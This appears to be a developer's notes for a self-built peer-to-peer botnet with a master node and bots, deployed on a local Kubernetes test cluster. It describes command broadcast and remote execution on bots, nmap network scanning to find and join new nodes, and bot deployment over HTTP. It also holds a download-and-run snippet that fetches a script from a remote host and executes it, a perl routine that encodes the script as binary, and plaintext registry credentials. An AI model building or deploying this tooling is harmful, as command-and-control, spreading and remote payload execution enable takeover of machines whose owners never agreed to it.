---
*** Desc:
Applicable to ~100 nodes -- (unable to test with more)

(MASTER NODE SHOULD HAVE MASTER SOCKET AFTER CLEANING)
(BOT SHOULD AUTOMATICALLY DROP EITHER INC|OUT CONNECTIONS IF EITHER IS MISSING)

Consists of:
    - master (0-node)
    - bots

Each node acts as both server and client (p2p)
Each node is directly connected on both ways (INC|OUT)

Master node:
    - listens for connections
    - input implemented via separate thread
    # -------------------------------------------------------------------
    # | CMD_PREFIX |             DESCRIPTION             |  ARGS        |
    # -------------------------------------------------------------------
    # | b          | (broadcast cmd)                     |  cmd         |
    # | f          | (file(send))                        |  file_path   |
    # | c          | (connect)                           |  ip:port     |
    # | dc         | (disconnect)                        |  ip          |
    # | cmd        | (cmd to node)                       |  ip:port|cmd |
    # | s          | (send to single node)               |  ip:port|msg |
    # | cs         | (connections)                       |              |
    # | opts       | (list options)                      |              |
    # | listconn   | (connect to ips from provided list) |              |
    # | reset      | (disconnect all nodes, re-scan net) |              |
    # | close      | (disconnect all nodes)              |              |
    # | renew      | (re-scan net)                       |              |
    # | exit       | (self-expl.)                        |              |
    # -------------------------------------------------------------------
    - supports broadcast & direct communication
    - can geolocate nodes (curl tool needed on bots)
    - can deploy new bot via HTTP (needs fix)
    - can scan networks & connect to new nodes dynamically (needs fix)
    - list of connections is shared among threads via queue

Bot node:
    - listens for connections
    - executes commands and sends result to master
    - auto-connects to every new node in network
    - broadcasts list of connections on each new connection



******************************************************************************************
*** Base setup:
1. create cluster from p2p/deployment/p2p-net/kind-cluster-config.yaml

2. run p2p/deployment/scripts/setup.sh

2. (to delete) run p2p/deployment/scripts/clear.sh
******************************************************************************************
*** Create kind cluster from config:
kind create cluster \
    --config /home/cheki/projects/p2p/deployment/p2p-net/kind-cluster-config.yaml

*** Set default kubernetes namespace:
kubectl config set-context --current --namespace=p2p

*** Helm CREATE chart:
helm create p2p-net

*** Helm INSTALL:
helm install --dry-run --debug --generate-name -f ../p2p-net/values.yaml ../p2p-net
helm install -f /home/cheki/projects/p2p/deployment/p2p-net/values.yaml \
                p2pnet \
                /home/cheki/projects/p2p/deployment/p2p-net

*** Helm UPGRADE:
helm upgrade --install p2p-network -f ../p2p-net/values.yaml ../p2p-net
******************************************************************************************
watch "kubectl get deploy -n p2p -o wide && \
       kubectl get po -n p2p -o wide && \
       kubectl get svc -n p2p -o wide"

kubectl get node -n p2p -o wide
******************************************************************************************
kind load docker-image p2p-0-node:1.0
kind load docker-image p2p-bot-node:1.0
******************************************************************************************
*** Create self-signed SSL cert:
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
  -keyout 172.20.0.20.key.pem -out 172.20.0.20.crt.pem -subj "/CN=172.20.0.20" 
******************************************************************************************
*** Up hosts in network:
kubectl exec \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep node-0) \
    -- nmap -n 10.42.0.1-255/24 -p 44000-49999 -oG - | awk '/Up$/{print $2}' | sort -V

kubectl exec \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep node-0) \
    -- nmap -sn 10.42.0.1-255 -oG - | awk '/Up$/{print $2}' | sort -V

kubectl exec \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep node-0) \
    -- nmap --iflist
******************************************************************************************
*** Add nodes ips in network to file:
kubectl exec \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep p2p-0-node) \
    -- sh -c "touch /p2p/ips.txt && nmap -n -sn 10.42.0.1-255 -oG - \
            | awk '/Up\$/{print \$2}' \
            | sort -V \
            | tee /p2p/ips.txt"
******************************************************************************************

*** Scale replicas:
    kubectl scale deployment/p2p-bot-node --replicas=50



*** Exec on pod by name prefix:
kubectl exec -it \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep p2p-0-node) \
    -- /bin/sh

kubectl exec -it \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep test-probe) \
    -- /bin/sh



*** Scan network & save ips to list:
nmap -vvv -n -sn 10.42.0.1-255 -oG - | awk '/Up$/{print $2}' | sort -V | tee /p2p/ips.txt



*** Attach to pod by name prefix:
kubectl attach -it \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep p2p-0-node)

kubectl attach -it \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep test-probe)



*** Get service ports:
kubectl describe service --namespace=p2p | grep -i nodeport | grep -o -E '[0-9]+'


******************************************************************************************
curl -vvv --insecure --user registryadmin:registrypassword https://192.168.1.61:47443
curl -vvv --insecure --user registryadmin:registrypassword http://192.168.1.61:47880
******************************************************************************************
*** Auto-download & run bot-node.py script (auto-connect to remote host):
path="node-autorun.py"
host="$(hostname -i):45666"
remotehost="172.19.0.3:31515"
if [ ! -f $path ]; then wget -O $path http://$remotehost; fi
if [ ! -f $path ]; then curl -vvv -o $path http://$remotehost; fi
python $path $host $remotehost
******************************************************************************************
*** Convert plaintext to bin & revert in perl

binary_dump=$(cat $path | perl -lpe '$_=join " ", unpack"(B8)*"')
plaintext_script=$(echo "$binary_dump" | perl -lape '$_=pack"(B8)*",@F')
